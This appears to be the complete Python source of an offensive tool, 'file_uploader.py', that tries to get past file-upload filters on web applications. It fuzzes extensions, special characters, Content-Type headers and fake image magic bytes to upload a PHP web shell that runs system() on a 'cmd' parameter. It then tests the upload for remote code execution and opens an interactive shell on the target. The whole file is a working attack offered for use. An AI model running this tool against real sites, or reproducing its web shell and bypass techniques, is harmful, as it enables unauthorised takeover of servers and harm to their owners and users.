import os
import tempfile
import requests
import argparse
import concurrent.futures
from urllib.parse import urljoin
from rich.console import Console
from rich.table import Table
from rich.text import Text

console = Console()

# === BANNER ===
BANNER = r"""
  ______ _ _        _                 _                       
 |  ____(_) |      | |               | |                      
 | |__   _| | ___  | |__  _   _ _ __ | | _____ _ __ ___  _ __  
 |  __| | | |/ _ \ | '_ \| | | | '_ \| |/ / _ \ '__/ _ \| '_ \ 
 | |    | | |  __/ | |_) | |_| | | | |   <  __/ | | (_) | | | |
 |_|    |_|_|\___| |_.__/ \__,_|_| |_|_|\_\___|_|  \___/|_| |_|

       [👻] F I L E _ U P L O A D E R . P Y [👻]

        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠟⠋⠉⠉⠙⠻⣦⡀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⣼⡿⠁⠀⠀⣤⣤⠀⠀⠈⢿⣇⠀⠀⠀   ghost uploading files...
        ⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠈⠻⠿⠟⠁⠀⠀⢸⣿⠀⠀⠀   silently planting web shells 👻📤
        ⠀⠀⠀⠀⠀⠀⠀⠘⢿⣷⣄⠀⠀⠀⠀⣠⣾⡿⠃⠀⠀⠀   Author: Gh0stSh3ll5619
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⠿⠛⠉⠀⠀⠀⠀⠀⠀   Ghostops-security.com
          ┌──────────────┐
          │ uploading... │
          │ shell.php    │
          └──────────────┘
"""

EXTENSION_CATEGORIES = {
    "php": [
        "php", "php3", "php4", "php5", "php7", "php8", "pht", "phar", "phpt", "pgif", "phtml", "phtm",
        "inc", "jpg.php", "jpeg.php", "png.php", "pHp", "pHP5", "PhAr"
    ],
    "asp": ["asp", "aspx", "config", "cer", "asa", "soap"],
    "jsp": ["jsp", "jspx", "jsw", "jsv", "jspf", "wss", "do", "actions"],
    "cfm": ["cfm", "cfml", "cfc", "dbm"],
    "perl": ["pl", "pm", "cgi", "lib"],
    "node": ["js", "json", "node"],
    "other": ["svg", "gif", "csv", "xml", "avi", "html", "zip"],
    "config": ["htaccess", "web.config", "ini", "json", "yaml"]
}

SPECIAL_CHARS = ['%20', '%0a', '%00', '%0d0a', '/', '.\\', '.', '…', ':']
DEFAULT_CONTENT_TYPES = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp']

# Magic headers to prepend
MAGIC_HEADERS = {
    'jpeg': b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01',
    'png': b'\x89PNG\r\n\x1a\n',
    'gif': b'GIF89a'
}

WEB_SHELL = "<?php echo 'CMD:'; system($_GET['cmd']); ?>"

SHELL_FILENAME = "payload_shell"
SHELL_FILEPATH = os.path.join(os.getcwd(), SHELL_FILENAME)
with open(SHELL_FILEPATH, 'w') as f:
    f.write(WEB_SHELL)


def create_payload_with_magic_bytes(magic_bytes):
    """Create a temporary file with magic bytes prepended to the PHP shell."""
    tmp_fd, tmp_path = tempfile.mkstemp()
    with os.fdopen(tmp_fd, 'wb') as tmp_file:
        tmp_file.write(magic_bytes)
        tmp_file.write(WEB_SHELL.encode())
    return tmp_path


def upload_file_custom(upload_url, filename, content_type='image/jpeg', magic_bytes=None):
    if magic_bytes:
        payload_path = create_payload_with_magic_bytes(magic_bytes)
        file_to_send = open(payload_path, 'rb')
    else:
        file_to_send = open(SHELL_FILEPATH, 'rb')

    files = {
        "uploadFile": (filename, file_to_send, content_type)
    }
    try:
        response = requests.post(upload_url, files=files, timeout=10)
        file_to_send.close()
        if "successfully" in response.text.lower():
            return True
    except Exception:
        pass
    return False


def test_shell_execution(shell_url):
    try:
        response = requests.get(f"{shell_url}?cmd=id", timeout=10)
        if any(i in response.text for i in ["uid=", "www-data", "root"]):
            return response.text.strip()
    except Exception:
        pass
    return None


def generate_variants(base_name, ext):
    variants = [
        f"{base_name}.jpg.{ext}",
        f"{base_name}.{ext}.jpg"
    ]
    for char in SPECIAL_CHARS:
        variants.extend([
            f"{base_name}{char}.{ext}.jpg",
            f"{base_name}.{ext}{char}.jpg",
            f"{base_name}.jpg{char}.{ext}",
            f"{base_name}.jpg.{ext}{char}"
        ])
    return variants


def shell_interaction(shell_url):
    console.print(f"[bold green][*] Web shell available at:[/bold green] {shell_url}")
    console.print("[bold yellow][*] Enter commands to execute or type 'exit' to quit.[/bold yellow]")
    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() in ('exit', 'quit'):
            break
        try:
            resp = requests.get(f"{shell_url}?cmd={cmd}", timeout=10)
            print(resp.text.strip())
        except Exception as e:
            print(f"[!] Error executing command: {e}")


def fuzz_extensions(upload_url, base_url, extensions, content_types=None, use_magic=False):
    results = []
    shells = []

    def process(ext):
        for filename in generate_variants("ghostshell", ext):
            for ctype in (content_types or ['image/jpeg']):
                if use_magic:
                    for m_name, m_bytes in MAGIC_HEADERS.items():
                        uploaded = upload_file_custom(upload_url, filename, content_type=ctype, magic_bytes=m_bytes)
                        shell_url = urljoin(base_url, f"/profile_images/{filename}")
                        if uploaded:
                            output = test_shell_execution(shell_url)
                            if output:
                                results.append((filename, shell_url, output, ctype, m_name))
                                if "CMD:" in output:
                                    shells.append(shell_url)
                            else:
                                results.append((filename, shell_url, "Uploaded but no RCE", ctype, m_name))
                        else:
                            results.append((filename, shell_url, "Upload failed", ctype, m_name))
                else:
                    uploaded = upload_file_custom(upload_url, filename, content_type=ctype)
                    shell_url = urljoin(base_url, f"/profile_images/{filename}")
                    if uploaded:
                        output = test_shell_execution(shell_url)
                        if output:
                            results.append((filename, shell_url, output, ctype, "None"))
                            if "CMD:" in output:
                                shells.append(shell_url)
                        else:
                            results.append((filename, shell_url, "Uploaded but no RCE", ctype, "None"))
                    else:
                        results.append((filename, shell_url, "Upload failed", ctype, "None"))

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(process, extensions)

    return results, shells


def print_results(results):
    console.print("\n[bold green]            File Upload Results             [/bold green]")
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Filename Variant")
    table.add_column("Shell URL")
    table.add_column("Execution Output")
    table.add_column("Content-Type Used")
    table.add_column("Magic Bytes")

    if not results:
        console.print("[bold red][-] No successful uploads detected.[/bold red]")
        return

    for filename, url, output, ctype, magic in results:
        if "uid=" in output or "www-data" in output or "CMD:" in output:
            color = "green"
        elif "Upload failed" in output:
            color = "red"
        else:
            color = "yellow"

        table.add_row(
            Text(filename, style=color),
            Text(url, style=color),
            Text(output.split('\n')[0], style=color),
            Text(ctype, style=color),
            Text(magic, style=color)
        )
    console.print(table)


def main():
    console.print(BANNER, style="bold cyan")

    parser = argparse.ArgumentParser(
        description="🛠️  File Upload Exploitation Tool with Extension, Content-Type & Magic Bytes Fuzzing",
        epilog="""
Examples:
  python3 file_uploader.py --upload-url http://site.com/upload.php --base-url http://site.com --category php
  python3 file_uploader.py --upload-url http://site.com/upload.php --base-url http://site.com --fuzz-content-type --magic-bytes
""",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("--upload-url", required=True, help="Target file upload handler (e.g. http://host/upload.php)")
    parser.add_argument("--base-url", required=True, help="Base URL to access uploaded files (e.g. http://host)")
    parser.add_argument("--category", default="php", choices=EXTENSION_CATEGORIES.keys() | {"all"},
                        help="Extension category to test (default: php)")
    parser.add_argument("--wordlist", help="Custom wordlist of extensions (one per line)")
    parser.add_argument("--fuzz-content-type", action="store_true", help="Enable fuzzing with multiple Content-Type headers")
    parser.add_argument("--content-type-list", help="Path to custom list of content types (e.g. image/jpeg)")
    parser.add_argument("--magic-bytes", action="store_true", help="Enable magic bytes injection (prepend real image headers)")

    args = parser.parse_args()

    if args.wordlist:
        with open(args.wordlist, 'r') as f:
            extensions = [line.strip().lstrip('.') for line in f if line.strip()]
    else:
        if args.category == "all":
            extensions = [ext for sub in EXTENSION_CATEGORIES.values() for ext in sub]
        else:
            extensions = EXTENSION_CATEGORIES.get(args.category, [])

    content_types = None
    if args.fuzz_content_type:
        if args.content_type_list:
            with open(args.content_type_list, 'r') as f:
                content_types = [line.strip() for line in f if line.strip()]
        else:
            content_types = DEFAULT_CONTENT_TYPES

    console.print(f"[*] Starting fuzz with payload type: [bold]{args.category}[/bold]")
    results, shells = fuzz_extensions(args.upload_url, args.base_url, extensions, content_types, use_magic=args.magic_bytes)
    print_results(results)

    if shells:
        if len(shells) == 1:
            shell_interaction(shells[0])
        else:
            console.print("\n[bold cyan][*] Multiple shells found. Choose one to interact with:[/bold cyan]")
            for i, s in enumerate(shells):
                console.print(f"[{i}] {s}")
            choice = input("Select shell index: ")
            try:
                idx = int(choice)
                if 0 <= idx < len(shells):
                    shell_interaction(shells[idx])
            except:
                print("Invalid selection. Exiting shell mode.")


if __name__ == "__main__":
    main()
